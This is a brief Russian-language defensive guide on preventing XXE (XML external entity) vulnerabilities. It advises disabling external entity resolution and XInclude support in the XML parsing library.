# Как предотвратить XXE-уязвимости
Практически все XXE-уязвимости возникают потому что библиотека парсинга XML в приложении поддерживает потенциально опасные возможности XML, которые приложению не нужны и не предполагаются к использованию. Самый простой и эффективный способ предотвратить XXE атаки это отключить эти возможности

Обычно достаточно отключить разрешение внешних сущностей и поддержку `XInclude`, это можно сделать через параметры конфигурации или программно, переопределив поведение по умолчанию. Подробности о том как отключить ненужные возможности смотрите в документации к вашей библиотеке или API парсинга XML
